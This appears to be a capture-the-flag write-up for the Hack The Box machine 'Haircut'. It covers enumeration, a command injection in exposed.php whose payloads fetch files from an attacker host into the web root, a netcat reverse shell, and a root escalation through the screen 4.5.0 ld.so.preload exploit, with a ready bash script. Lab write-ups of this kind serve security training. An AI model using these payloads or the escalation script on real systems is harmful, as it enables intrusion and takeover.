## Default Information
IP Address: 10.10.10.24\
OS: Linux

## Discovery

Before we start, let's first add the IP address and the host to our ```/etc/hosts``` file.

```
10.10.10.24    haircut.htb
```

### Nmap
We will then use the open ports obtained from masscan to run a scan using nmap to enumerate the services operating behind each port

| Port Number | Service | Version | State |
|-----|------------------|----------------------|----------------------|
| 22  | SSH | OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0) | Open |
| 80  | HTTP | nginx 1.10.0 (Ubuntu) | Open |

Using Nmap to scan for vulnerabilities, we only discover that the site is vulnerable to CVE-2011-3192 which is a DOS attack on Apache web server. This is not very useful for us in this case.


### Gobuster
We will then use Gobuster to find the endpoints that are accessible from http://haircut.htb

```
http://10.10.10.24:80/index.html           (Status: 200) [Size: 144]
http://10.10.10.24:80/test.html            (Status: 200) [Size: 223]
http://10.10.10.24:80/uploads              (Status: 301) [Size: 194] [--> http://10.10.10.24/uploads/]
http://10.10.10.24:80/hair.html            (Status: 200) [Size: 141]
http://10.10.10.24:80/exposed.php          (Status: 200) [Size: 446]
```

### Web-content discovery

Looking at http://haircut.htb/exposed.php, we realized that we will be executing a curl command using the input that we put into the form.

![Exposed.php](https://github.com/joelczk/writeups/blob/main/HTB/Images/Haircut/exposed_php.png)

## Exploit
### Command Injection on exposed.php

We realized that http://haircut.htb/exposed.htb is vulnerable to command injection attack by modifying the input to become ```http://10.10.16.4:3000/$(id)```

![Command Injection](https://github.com/joelczk/writeups/blob/main/HTB/Images/Haircut/command_injection.png)

However when we try to put in the reverse shell payload, we realize that we are unable to execute some of the reverse shell payload as most of these characters are being blacklisted by the web server.

However, we do realize that we are able to upload by modifying the payload to become ```http://localhost$(curl http://10.10.16.6:3000/hi.html -o uploads/hi.html)```

![Upload](https://github.com/joelczk/writeups/blob/main/HTB/Images/Haircut/uploads.png)

Afterwards, we will be able to use curl command to obtain the contents of the uploaded file.

```
┌──(kali㉿kali)-[~]
└─$ curl -ilk http://haircut.htb/uploads/hi.html
HTTP/1.1 200 OK
Server: nginx/1.10.0 (Ubuntu)
Date: Fri, 24 Dec 2021 05:12:09 GMT
Content-Type: text/html
Content-Length: 69
Last-Modified: Fri, 24 Dec 2021 05:11:44 GMT
Connection: keep-alive
ETag: "61c55690-45"
Accept-Ranges: bytes

<html>
<body>
<p> Testing for command injection </p>
</body>
</html>
```

### Obtaining reverse shell

Afterwards, we will modify the input to upload the reverse shell on our local machine onto the website and we will use curl to spawn the reverse shell.

Afterwards, we will then move on to stabiliizing the reverse shell.

```
┌──(kali㉿kali)-[~]
└─$ nc -nlvp 4000
listening on [any] 4000 ...
connect to [10.10.16.6] from (UNKNOWN) [10.10.10.24] 57040
Linux haircut 4.4.0-78-generic #99-Ubuntu SMP Thu Apr 27 15:29:09 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
 06:24:15 up  1:12,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@haircut:/$ export TERM=xterm
export TERM=xterm
www-data@haircut:/$ stty cols 132 rows 34
stty cols 132 rows 34
```

### Obtaining user flag

```
www-data@haircut:/home$ cat maria/user.txt
cat maria/user.txt
<Redacted user flag>
```

### Privilege Escalation to root
We realize that
```
www-data@haircut:/tmp$ find / -perm -u=s -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
/bin/ntfs-3g
/bin/ping6
/bin/fusermount
/bin/su
/bin/mount
/bin/ping
/bin/umount
/usr/bin/sudo
/usr/bin/pkexec
/usr/bin/newuidmap
/usr/bin/newgrp
/usr/bin/newgidmap
/usr/bin/gpasswd
/usr/bin/at
/usr/bin/passwd
/usr/bin/screen-4.5.0
/usr/bin/chsh
/usr/bin/chfn
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
```

Trying to execute ```/usr/bin/screen-4.5.0 -x root/root```, we realize that we are unable to spawn another screen session with root privileges due to missing /tmp/screens/S-root

```
www-data@haircut:/tmp$ /usr/bin/screen-4.5.0 -x root/root
/usr/bin/screen-4.5.0 -x root/root
Cannot access /tmp/screens/S-root: No such file or directory
```

This is mainly due to the fact that there are no sockets that is being created for www-data

```
www-data@haircut:/$ /usr/bin/screen-4.5.0 -list        
/usr/bin/screen-4.5.0 -list
No Sockets found in /tmp/screens/S-www-data.
```

Looking at [exploitdb](https://www.exploit-db.com/exploits/41154), we are able to find a script for privilege escalation on screen 4.5.0. However, we are unable to execute the script successfully for privilege escalation.

To continue with the exploit, we will break down the exploit script into various portions.
![Privilege Escalation with screen](https://github.com/joelczk/writeups/blob/main/HTB/Images/Haircut/pe_script.png)

First, we will first compile the binaries on our local machine and transfer it to our /tmp directory on the server.

Afterwhich, we would set umask and execute the screen-4.5.0 binary

```
www-data@haircut:/etc$ umask 000
umask 000
www-data@haircut:/etc$ screen-4.5.0 -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so" 
screen-4.5.0 -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so" 
```

We will then check the ld.so.preload to ensure that it is now linked to /tmp/libhax.so

```
www-data@haircut:/etc$ cat ld.so.preload
cat ld.so.preload
' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
[+] done!

/tmp/libhax.so
```

Finally, all we have to do is to execute the /tmp/rootshell to obtain root privileges

```
www-data@haircut:/etc$ /tmp/rootshell     
/tmp/rootshell
# whoami
whoami
root
```

### Obtaining root flag

```
# cat /root/root.txt
cat /root/root.txt
<Redacted root flag>
```

## Beyond root
### Privilege Escalation to root shell

The privilege escalation can be automated with a simple script below:

```
#!/bin/bash
cd /etc
echo "[+] Setting unmask..."
umask 000
echo "[+] Executing screen to link libhax.so to /etc/ld.so.preload"
screen-4.5.0 -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so"
echo "[+] Executing rootshell"
/tmp/rootshell 
```

### Command Injection

Checking /var/www/html/exposed.php, we can find a list of characters that are being banned on the backend. However, $ is not being banned from the backend which resulted in the command injection that we can exploit.

```
$disallowed=array('%','!','|',';','python','nc','perl','bash','&','#','{','}','[',']');
foreach($disallowed as $naughty){
    if(strpos($userurl,$naughty) !==false){
        echo $naughty.' is not a good thing to put in a URL';
        $naughtyurl=1;
    }
}
```

We can also see that the command injection arises from the curl command that is being executed in the backend and the ```$userurl``` is not being properly sanitised.

```
if($naughtyurl==0){
    echo shell_exec("curl ".$userurl." 2>&1"); 
}
```

Looking at the code, we can find another way to upload the reverse shell code onto the server, by modifying the input to ```http://10.10.16.6:3000/shell.php -o /tmp/shell.php```. This would essentially mean that ```curl http://10.10.16.6:3000/shell.php -o /tmp/shell.php``` is being executed in the backend.

![Command Injection](https://github.com/joelczk/writeups/blob/main/HTB/Images/Haircut/command_injection_2.png)
